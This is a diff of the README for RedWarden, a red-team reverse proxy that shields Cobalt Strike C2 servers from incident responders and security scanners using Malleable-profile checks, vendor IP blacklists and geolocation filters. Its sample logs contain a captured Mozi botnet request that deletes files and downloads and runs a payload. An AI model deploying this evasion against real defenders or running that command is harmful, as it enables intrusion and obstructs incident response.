@@ -6,43 +6,248 @@
 
 Red Teaming business has seen [several](https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/) [different](https://posts.specterops.io/automating-apache-mod-rewrite-and-cobalt-strike-malleable-c2-profiles-d45266ca642) [great](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10) ideas on how to combat incident responders and misdirect them while offering resistant C2 redirectors network at the same time.  
 
-This piece of code tries to combine many of these great ideas into a one, lightweight utility, mimicking Apache2 in it's roots of being a simple HTTP(S) reverse-proxy. Combining Malleable C2 profiles understanding, knowledge of bad IP addresses pool and a flexibility of easily adding new inspection and misrouting logc - resulted in having a crafty repellent for IR evasion. 
+This work combines many of those great ideas into a one, lightweight utility, mimicking Apache2 in it's roots of being a simple HTTP(S) reverse-proxy. 
+
+Combining Malleable C2 profiles understanding, knowledge of bad IP addresses pool and a flexibility of easily adding new inspection and misrouting logic - resulted in having a crafty repellent for IR inspections. 
 
 
 ### Abstract
 
-This program acts as a HTTP/HTTPS reverse-proxy with several restrictions imposed upon which requests and from whom it should process, similarly to the .htaccess file in Apache2's mod_rewrite.
+This program acts as a HTTP/HTTPS reverse-proxy with several restrictions imposed upon inbound C2 HTTP requests selecting which packets to direct to the Teamserver and which to drop, similarly to the .htaccess file in Apache2's `mod_rewrite`.
 
-`RedWarden` was created to resolve the problem of effective IR/AV/EDRs/Sandboxes evasion on the C2 redirector's backyard.
+`RedWarden` was created to resolve the problem of effective IR/AV/EDRs/Sandboxes evasion on the C2 redirector's layer. It's intended to supersede classical Apache2 + mod_rewrite or alike setups used for redirectors.
 
 ** Features:**
 
-- Grepable output log entries useful to track peer connectivity events/issues
-- Malleable C2 Profile parser able to validate inbound HTTP/S requests strictly according to malleable's contract and drop in case of violation (Malleable Profiles 4.0+ with variants covered)
-- Ability to unfilter unexpected and unwanted HTTP headers added by interim systems such as proxies and caches (think CloudFlare) in order to conform to a valid Malleable contract. 
+- Malleable C2 Profile parser able to validate inbound HTTP/S requests strictly according to malleable's contract and drop outlaying packets in case of violation (Malleable Profiles 4.0+ with variants covered)
+- Ability to unfilter/repair unexpected and unwanted HTTP headers added by interim systems such as proxies and caches (think CloudFlare) in order to conform to a valid Malleable contract. 
 - Integrated curated massive blacklist of IPv4 pools and ranges known to be associated with IT Security vendors
+- Grepable output log entries (in both Apache2 combined access log and custom RedWarden formats) useful to track peer connectivity events/issues
 - Ability to query connecting peer's IPv4 address against IP Geolocation/whois information and confront that with predefined regular expressions to rule out peers connecting outside of trusted organizations/countries/cities etc.
 - Built-in Replay attacks mitigation enforced by logging accepted requests' MD5 hashsums into locally stored SQLite database and preventing requests previously accepted.
-- Functionality to ProxyPass requests matching specific URL onto other Hosts
+- Allows to define ProxyPass statemtents to pass requests matching specific URL onto other Hosts
 - Support for multiple Teamservers
 - Support for many reverse-proxying Hosts/redirection sites giving in a randomized order - which lets load-balance traffic or build more versatile infrastructures
-- Sleepless nights spent on troubleshooting "why my Beacon doesn't work over CloudFlare/CDN/Domain Fronting" are over now thanks to this script and its ability to strip unwanted garbage from our beloved Beacon requests.
+- Can repair HTTP packets according to expected malleable contract in case some of the headers were corrupted in traffic
+- Sleepless nights spent on troubleshooting "why my Beacon doesn't work over CloudFlare/CDN/Domain Fronting" are over now thanks to detailed verbose HTTP(S) requests/responses logs
 
-The RedWarden can act as a CobaltStrike Teamserver C2 redirector, given Malleable C2 profile used during the campaign and teamserver's hostname:port. The plugin will parse supplied malleable profile in order to understand which inbound requests may possibly come from the compatible Beacon or are not compliant with the profile and therefore should be misdirected. Sections such as http-stager, http-get, http-post and their corresponding uris, headers, prepend/append patterns, User-Agent are all used to distinguish between legitimate beacon's request and some Internet noise or IR/AV/EDRs out of bound inquiries. 
+The RedWarden acts as a CobaltStrike Teamserver C2 redirector, given Malleable C2 profile used during the campaign and teamserver's `hostname:port`. It will parse supplied malleable profile in order to understand which inbound requests may possibly come from the compatible Beacons and differentiate them from the ones that are not compliant and thus should be misdirected. 
 
-The plugin was also equipped with marvelous known bad IP ranges coming from:
+Sections such as `http-stager`, `http-get`, `http-post` and their corresponding uris, headers, prepend/append patterns, User-Agent are all used to distinguish between legitimate beacon's request and some Internet noise or IR/AV/EDRs out of bound inquiries. 
+
+The program benefits from the marvelous known bad IP ranges coming from:
   curi0usJack and the others:
   [https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10)
 
-Using an IP addresses blacklisting along with known bad keywords lookup through Reverse-IP DNS queries and HTTP headers, the reliability of this tool results considerably increased redirector's resiliency to the unauthorized peers wanting to examine protected infrastructure.
+Using an IP addresses blacklisting along with known bad keywords lookup through Reverse-IP DNS queries and HTTP headers inspection, brings the reliability to considerably increase redirector's resiliency to the unauthorized peers wanting to examine attacker infrastructures.
 
 Use wisely, stay safe.
+
+
+### Impose IP Geolocation on your Beacon traffic originators
+
+You've done your Pre-Phish and OSINT very well. You now know where your targets live and have some clues where traffic should be originating from, or at least how to detect completely auxiliary traffic.
+How to impose IP Geolocation on Beacon requests on a redirector?
+
+RedWarden comes at help!
+
+Let's say, you want only to accept traffic originating from Poland, Europe. 
+Your Pre-Phish/OSINT results indicate that:
+
+- `89.64.64.150` is a legitimate IP of one of your targets, originating from Poland
+- `59.99.140.76` whereas this one is not and it reached your systems as a regular Internet noise packet.
+
+You can use RedWarden's utility `lib/ipLookupHelper.py` to collect IP Geo metadata about these two addresses:
+
+```
+bash$ python3 ipLookupHelper.py
+
+Usage: ./ipLookupHelper.py <ipaddress> [malleable-redirector-config]
+
+Use this small utility to collect IP Lookup details on your target IPv4 address and verify whether
+your 'ip_geolocation_requirements' section of proxy2 malleable-redirector-config.yaml would match that
+IP address. If second param is not given - no 
+```
+
+The former brings:
+```
+bash$ python3 ipLookupHelper.py 89.64.64.150
+[dbg] Following IP Lookup providers will be used: ['ip_api_com', 'ipapi_co']
+[.] Lookup of: 89.64.64.150
+[dbg] Calling IP Lookup provider: ipapi_co
+[dbg] Calling IP Lookup provider: ip_api_com
+[dbg] New IP lookup entry cached: 89.64.64.150
+[.] Output:
+{
+  "organization": [
+    "UPC Polska Sp. z o.o.",
+    "UPC.pl",
+    "AS6830 Liberty Global B.V."
+  ],
+  "continent": "Europe",
+  "continent_code": "EU",
+  "country": "Poland",
+  "country_code": "PL",
+  "ip": "89.64.64.150",
+  "city": "Warsaw",
+  "timezone": "Europe/Warsaw",
+  "fulldata": {
+    "status": "success",
+    "country": "Poland",
+    "countryCode": "PL",
+    "region": "14",
+    "regionName": "Mazovia",
+    "city": "Warsaw",
+    "zip": "00-202",
+    "lat": 52.2484,
+    "lon": 21.0026,
+    "timezone": "Europe/Warsaw",
+    "isp": "UPC.pl",
+    "org": "UPC Polska Sp. z o.o.",
+    "as": "AS6830 Liberty Global B.V.",
+    "query": "89.64.64.150"
+  },
+  "reverse_ip": "89-64-64-150.dynamic.chello.pl"
+}
+```
+
+and the latter gives:
+```
+bash$ python3 ipLookupHelper.py 59.99.140.76
+[dbg] Following IP Lookup providers will be used: ['ip_api_com', 'ipapi_co']
+[dbg] Read 1 cached entries from file.
+[.] Lookup of: 59.99.140.76
+[dbg] Calling IP Lookup provider: ip_api_com
+[dbg] New IP lookup entry cached: 59.99.140.76
+[.] Output:
+{
+  "organization": [
+    "",
+    "BSNL Internet",
+    "AS9829 National Internet Backbone"
+  ],
+  "continent": "Asia",
+  "continent_code": "AS",
+  "country": "India",
+  "country_code": "IN",
+  "ip": "59.99.140.76",
+  "city": "Palakkad",
+  "timezone": "Asia/Kolkata",
+  "fulldata": {
+    "status": "success",
+    "country": "India",
+    "countryCode": "IN",
+    "region": "KL",
+    "regionName": "Kerala",
+    "city": "Palakkad",
+    "zip": "678001",
+    "lat": 10.7739,
+    "lon": 76.6487,
+    "timezone": "Asia/Kolkata",
+    "isp": "BSNL Internet",
+    "org": "",
+    "as": "AS9829 National Internet Backbone",
+    "query": "59.99.140.76"
+  },
+  "reverse_ip": ""
+}
+```
+
+Now you see that the former one had `"country": "Poland"` whereas the latter `"country": "India"`. With that knowledge we are ready to devise our constraints in form of a hefty YAML dictionary:
+
+```
+ip_geolocation_requirements:
+  organization:
+  continent:
+  continent_code:
+  country:
+     - Poland
+     - PL
+     - Polska
+  country_code:
+  city:
+  timezone:
+```
+
+Each of that dictionary's entries accept regular expression to be matched upon determined IP Geo metadata of inbound peer's IP address.
+We use three entries in `country` property to allow requests having one of specified values.
+
+Having that set in your configuration, you can verify whether another IP address would get passed through RedWarden's IP Geolocation discriminator or not with `ipLookupHelper` utility accepting second parameter:
+
+![ipLookupHelper IP Geo discriminator](https://raw.githubusercontent.com/mgeeky/RedWarden/master/images/2.png)
+
+The very last line tells you whether packet would be blocked or accepted.
+
+And that's all! Configure your IP Geolocation constraints wisely and safely, carefully inspect RedWarden logs for any IP Geo-related DROP entries and keep your C2 traffic nice and tidy!
+
+
+### Repair tampered Beacon requests
+
+If you happen to use interim systems such as AWS Lambda or CloudFlare as your Domain Fronting / redirectors, you have surely came across a situation where some of your packets couldn't get accepted by the Teamserver as they deviated from the agreed malleable contract. Was it a tampered or removed HTTP header, reordered cookies or anything else - I bet that wasted plenty hours of your life.
+
+To combat C2 channels setup process issues and interim systems tamperings, RedWarden offers functionality to repair Beacon packets.
+
+It does so by checking what Malleable Profile expects packet to be and can restore configured HTTP headers to their agreed values according to the profile's requirements.
+
+Consider following simple profile:
+
+```
+http-get {
+        set uri "/api/abc";
+        client {
+
+                header "Accept-Encoding" "gzip, deflate";
+
+                metadata {
+                        base64url;
+                        netbios;
+                        base64url;
+                        parameter "auth";
+                }
+        }
+        ...
+```
+
+You see this `Accept-Encoding`? Every Beacon request has to come up with that Header and that value. What happens if your Beacon hits CloudFlare systems and they emit a request that will be stripped from that Header or will have `Accept-Encoding: gzip` instead? Teamserver will drop the request on the spot.
+
+By setting this header in RedWarden configuration section dubbed `protect_these_headers_from_tampering` you can safe your connection.:
+
+```
+#
+# If RedWarden validates inbound request's HTTP headers, according to policy drop_malleable_without_expected_header_value:
+#   "[IP: DROP, reason:6] HTTP request did not contain expected header value:"
+#
+# and senses some header is missing or was overwritten along the wire, the request will be dropped. We can relax this policy
+# a bit however, since there are situations in which Cache systems (such as Cloudflare) could tamper with our requests thus
+# breaking Malleable contracts. What we can do is to specify list of headers, that should be overwritten back to their values
+# defined in provided Malleable profile.
+#
+# So for example, if our profile expects:
+#   header "Accept-Encoding" "gzip, deflate";
+#
+# but we receive a request having following header set instead:
+#   Accept-Encoding: gzip
+#
+# Because it was tampered along the wire by some of the interim systems (such as web-proxies or caches), we can
+# detect that and set that header's value back to what was expected in Malleable profile.
+#
+# In order to protect Accept-Encoding header, as an example, the following configuration could be used:
+#   protect_these_headers_from_tampering:
+#     - Accept-Encoding
+#
+#
+# Default: <empty-list>
+#
+protect_these_headers_from_tampering:
+  - Accept-Encoding
+```
+
 
 ### Example usage
 
 All settings were moved to the external file:
 ```
-$ python3 proxy2.py --config example-config.yaml
+$ python3 RedWarden.py --config example-config.yaml
 
   [INFO] 19:21:42: Loading 1 plugin...
   [INFO] 19:21:42: Plugin "malleable_redirector" has been installed.
@@ -74,7 +279,6 @@ $ python3 proxy2.py --config example-config.yaml
 Where **example-config.yaml** contains:
 
 ```
-plugin: malleable_redirector
 verbose: True
 
 port:
@@ -97,6 +301,155 @@ The above output contains a line pointing out that there has been an unauthorize
   [DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
   [...]
 ```
+
+
+### Example output
+
+Let's take a look at the output the proxy produces.
+
+Under `verbose: True` option, the verbosity will be set to INFO at most telling accepted requests from dropped ones.
+
+The request may be accepted if it confronted to all of the criterias configured in RedWarden's configuration file. Such a situation will be followed with `[ALLOW, ...]` entry log:
+
+```
+[INFO] 2021-04-24/17:30:48: [REQUEST] GET /js/scripts.js
+[INFO] 2021-04-24/17:30:48: == Valid malleable http-get (variant: default) request inbound.
+[INFO] 2021-04-24/17:30:48: [ALLOW, 2021-04-24/19:30:48, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+[INFO] 2021-04-24/17:30:48: Connected peer sent 2 valid http-get and 0 valid http-post requests so far, out of 15/5 required to consider him temporarily trusted
+[INFO] 2021-04-24/17:30:48: Plugin redirected request from [attacker.com] to [127.0.0.1:5555]
+```
+
+Should the request fail any of the checks RedWarden carries on each request, the corresponding `[DROP, ...]` line will be emitted containing information about the drop **reason**.:
+
+```
+[INFO] 2021-04-24/16:48:28: [REQUEST] GET /
+[ERROR] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:28, reason:1, 128.14.211.186] inbound User-Agent differs from the one defined in C2 profile.
+[INFO] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:28, 128.14.211.186] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+[ERROR] 2021-04-24/16:48:29: [REDIRECTING invalid request from 128.14.211.186 (zl-dal-us-gp3-wk107.internet-census.org)] GET /
+```
+
+There are plenty of reasons dictating whether request can be dropped. Each of these checks can be independently turned on and off according to requirements or in a process of fine-tuning or erroneus decision fixing:
+
+Excerpt from `example-config.yaml`:
+```
+#
+# Fine-grained requests dropping policy - lets you decide which checks
+# you want to have enforced and which to skip by setting them to False
+#
+# Default: all checks enabled
+#
+policy:
+  # [IP: ALLOW, reason:0] Request conforms ProxyPass entry (url="..." host="..."). Passing request to specified host
+  allow_proxy_pass: True
+  # [IP: ALLOW, reason:2] Peer's IP was added dynamically to a whitelist based on a number of allowed requests
+  allow_dynamic_peer_whitelisting: True
+  # [IP: DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
+  drop_invalid_useragent: True
+  # [IP: DROP, reason:2] HTTP header name contained banned word
+  drop_http_banned_header_names: True
+  # [IP: DROP, reason:3] HTTP header value contained banned word:
+  drop_http_banned_header_value: True
+  # [IP: DROP, reason:4b] peer's reverse-IP lookup contained banned word
+  drop_dangerous_ip_reverse_lookup: True
+  # [IP: DROP, reason:4e] Peer's IP geolocation metadata contained banned keyword! Peer banned in generic fashion.
+  drop_ipgeo_metadata_containing_banned_keywords: True
+  # [IP: DROP, reason:5] HTTP request did not contain expected header
+  drop_malleable_without_expected_header: True
+  # [IP: DROP, reason:6] HTTP request did not contain expected header value:
+  drop_malleable_without_expected_header_value: True
+  # [IP: DROP, reason:7] HTTP request did not contain expected (metadata|id|output) section header:
+  drop_malleable_without_expected_request_section: True
+  # [IP: DROP, reason:8] HTTP request was expected to contain (metadata|id|output) section with parameter in URI:
+  drop_malleable_without_request_section_in_uri: True
+  # [IP: DROP, reason:9] Did not found append pattern:
+  drop_malleable_without_prepend_pattern: True
+  # [IP: DROP, reason:10] Did not found append pattern:
+  drop_malleable_without_apppend_pattern: True
+  # [IP: DROP, reason:11] Requested URI does not aligns any of Malleable defined variants:
+  drop_malleable_unknown_uris: True
+  # [IP: DROP, reason:12] HTTP request was expected to contain <> section with URI-append containing prepend/append fragments
+  drop_malleable_with_invalid_uri_append: True
+```
+
+
+By default all of these checks are enforced.
+
+Here is the example output from running the proxy - showing how requests gets dropped and allowed:
+
+```
+[INFO] 2021-04-24/16:37:13: Loading 1 plugin...
+[INFO] 2021-04-24/16:37:13: Plugin "malleable_redirector" has been installed.
+[INFO] 2021-04-24/16:37:13: Preparing SSL certificates and keys for https traffic interception...
+[INFO] 2021-04-24/16:37:13: Using provided CA key file: /etc/letsencrypt/live/attacker.com/privkey.pem
+[INFO] 2021-04-24/16:37:13: Using provided CA certificate file: /etc/letsencrypt/live/attacker.com/fullchain.pem
+[INFO] 2021-04-24/16:37:13: Using provided Certificate key: /home/mariusz/devel/Penetration-Testing-Tools/red-teaming/malleable_redirector/proxy2/ca-cert/cert.key
+[INFO] 2021-04-24/16:37:13: Teeing stdout output to /home/mariusz/work/santa-soc-21/proxy2.log log file.
+[INFO] 2021-04-24/16:37:13: Collected 3 proxy-pass statements:
+        Rule 0. Proxy requests with URL: "^/foobar\d*$" to host bing.com
+        Rule 1. Proxy requests with URL: "^/myip$" to target URL http://ip-api.com/json/
+        Rule 2. Proxy requests with URL: "^/alwayspass$" to host google.com (options: nodrop)
+[INFO] 2021-04-24/16:37:13: Loaded 1890 blacklisted CIDRs.
+[INFO] 2021-04-24/16:37:13: Serving proxy on: http://0.0.0.0:80 ...
+[INFO] 2021-04-24/16:37:13: Serving proxy on: https://0.0.0.0:443 ...
+[INFO] 2021-04-24/16:48:28: [REQUEST] GET /
+[ERROR] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:28, reason:1, 128.14.211.186] inbound User-Agent differs from the one defined in C2 profile.
+[INFO] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:28, 128.14.211.186] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+[ERROR] 2021-04-24/16:48:29: [REDIRECTING invalid request from 128.14.211.186 (zl-dal-us-gp3-wk107.internet-census.org)] GET /
+[INFO] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:29, 128.14.211.186] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+[INFO] 2021-04-24/16:48:29: [RESPONSE] HTTP 301 Moved Permanently, length: 183
+[INFO] 2021-04-24/16:59:56: [REQUEST] GET /shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
+[ERROR] 2021-04-24/16:59:57: [DROP, 2021-04-24/18:59:56, reason:1, 59.99.140.76] inbound User-Agent differs from the one defined in C2 profile.
+[INFO] 2021-04-24/16:59:57: [DROP, 2021-04-24/18:59:56, 59.99.140.76] "/shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws" - UA: "Hello, world"
+[ERROR] 2021-04-24/16:59:57: [REDIRECTING invalid request from 59.99.140.76] GET /shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
+[INFO] 2021-04-24/16:59:57: [DROP, 2021-04-24/18:59:57, 59.99.140.76] "/shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws" - UA: "Hello, world"
+[INFO] 2021-04-24/16:59:57: [RESPONSE] HTTP 301 Moved Permanently, length: 212
+[INFO] 2021-04-24/17:02:50: [REQUEST] GET /
+[ERROR] 2021-04-24/17:02:50: [DROP, 2021-04-24/19:02:50, reason:4a, 94.127.104.226] Peer's IP address is blacklisted: (94.0.0.0/8 - OtherVThosts)
+[INFO] 2021-04-24/17:02:50: Here is what we know about that address (94.127.104.226): ({'organization': ['', 'INEA SA', 'AS13110 INEA S.A.'], 'continent': 'Europe', 'continent_code': 'EU', 'country': 'Poland', 'country_code': 'PL', 'ip
+[INFO] 2021-04-24/17:02:50: [DROP, 2021-04-24/19:02:50, 94.127.104.226] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+[ERROR] 2021-04-24/17:02:58: [REDIRECTING invalid request from 94.127.104.226 (d104-226.icpnet.pl)] GET /
+[ERROR] 2021-04-24/17:02:58: [DROP, 2021-04-24/19:02:58, reason:4a, 94.127.104.226] Peer's IP address is blacklisted: (94.0.0.0/8 - OtherVThosts)
+[INFO] 2021-04-24/17:02:58: [DROP, 2021-04-24/19:02:58, 94.127.104.226] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+[INFO] 2021-04-24/17:02:58: [RESPONSE] HTTP 301 Moved Permanently, length: 212
+[INFO] 2021-04-24/17:03:26: [REQUEST] GET /
+[ERROR] 2021-04-24/17:03:26: [DROP, 2021-04-24/19:03:26, reason:1, 128.14.211.190] inbound User-Agent differs from the one defined in C2 profile.
+[INFO] 2021-04-24/17:03:26: [DROP, 2021-04-24/19:03:26, 128.14.211.190] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+[ERROR] 2021-04-24/17:03:26: [REDIRECTING invalid request from 128.14.211.190 (zl-dal-us-gp3-wk108.internet-census.org)] GET /
+[INFO] 2021-04-24/17:03:26: [DROP, 2021-04-24/19:03:26, 128.14.211.190] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+[INFO] 2021-04-24/17:03:26: [RESPONSE] HTTP 301 Moved Permanently, length: 183
+[INFO] 2021-04-24/17:10:18: [REQUEST] GET /
+[ERROR] 2021-04-24/17:10:19: [DROP, 2021-04-24/19:10:18, reason:1, 51.254.59.114] inbound User-Agent differs from the one defined in C2 profile.
+[INFO] 2021-04-24/17:10:19: [DROP, 2021-04-24/19:10:18, 51.254.59.114] "/" - UA: "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+[ERROR] 2021-04-24/17:10:19: [REDIRECTING invalid request from 51.254.59.114 (scan019.intrinsec.com)] GET /
+[INFO] 2021-04-24/17:10:19: [DROP, 2021-04-24/19:10:19, 51.254.59.114] "/" - UA: "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+[INFO] 2021-04-24/17:10:19: [RESPONSE] HTTP 301 Moved Permanently, length: 212
+[INFO] 2021-04-24/17:14:32: [REQUEST] GET /
+[ERROR] 2021-04-24/17:14:33: [DROP, 2021-04-24/19:14:32, reason:1, 45.83.67.59] inbound User-Agent differs from the one defined in C2 profile.
+[INFO] 2021-04-24/17:14:33: [DROP, 2021-04-24/19:14:32, 45.83.67.59] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
+[ERROR] 2021-04-24/17:14:33: [REDIRECTING invalid request from 45.83.67.59] GET /
+[INFO] 2021-04-24/17:14:33: [DROP, 2021-04-24/19:14:33, 45.83.67.59] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
+[INFO] 2021-04-24/17:14:33: [RESPONSE] HTTP 301 Moved Permanently, length: 183
+[INFO] 2021-04-24/17:30:09: [REQUEST] GET /js/scripts.js
+[INFO] 2021-04-24/17:30:17: == Valid malleable http-get (variant: default) request inbound.
+[INFO] 2021-04-24/17:30:17: Here is what we know about that address (111.222.223.224): ({'organization': ['Santander Bank Polska S.A', 'Santander Bank Polska S.A.', 'AS59977 Santander Bank Polska S.A.'], 'continent': 'Europe', 'continent
+[INFO] 2021-04-24/17:30:17: [ALLOW, 2021-04-24/19:30:09, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+[INFO] 2021-04-24/17:30:17: Connected peer sent 1 valid http-get and 0 valid http-post requests so far, out of 15/5 required to consider him temporarily trusted
+[INFO] 2021-04-24/17:30:17: Plugin redirected request from [attacker.com] to [127.0.0.1:5555]
+[INFO] 2021-04-24/17:30:18: [ALLOW, 2021-04-24/19:30:18, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+[INFO] 2021-04-24/17:30:18: [RESPONSE] HTTP 200 OK, length: 1828
+[INFO] 2021-04-24/17:30:48: [REQUEST] GET /js/scripts.js
+[INFO] 2021-04-24/17:30:48: == Valid malleable http-get (variant: default) request inbound.
+[INFO] 2021-04-24/17:30:48: [ALLOW, 2021-04-24/19:30:48, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+[INFO] 2021-04-24/17:30:48: Connected peer sent 2 valid http-get and 0 valid http-post requests so far, out of 15/5 required to consider him temporarily trusted
+[INFO] 2021-04-24/17:30:48: Plugin redirected request from [attacker.com] to [127.0.0.1:5555]
+[INFO] 2021-04-24/17:30:48: [ALLOW, 2021-04-24/19:30:48, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+[INFO] 2021-04-24/17:30:48: [RESPONSE] HTTP 200 OK, length: 202937
+[INFO] 2021-04-24/17:30:49: [REQUEST] POST /fonts/KFOmCnqEu92Fr1Mu4mxK.woff2
+[INFO] 2021-04-24/17:30:49: == Valid malleable http-post (variant: default) request inbound.
+```
+
+Turning `debug: True` will swamp your console buffer with plenty of log lines describing each step RedWarden takes in its complex decisioning process. 
+If you want to see your requests and responses full bodies - set `debug` and `trace` to true and get buried in logging burden!
 
 
 ### Plugin options
